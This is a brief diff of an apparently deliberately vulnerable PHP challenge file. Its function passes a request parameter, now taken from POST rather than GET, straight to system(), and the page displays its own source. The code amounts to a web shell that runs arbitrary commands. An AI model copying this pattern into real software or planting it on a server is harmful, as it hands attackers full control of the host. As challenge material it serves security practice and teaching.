@@ -20,7 +20,7 @@ function hello_shell($cmd){
     system($cmd);
 }
 
-isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
+isset($_POST['cmd']) ? hello_shell($_POST['cmd']) : null;
 
 highlight_file(__FILE__);
 
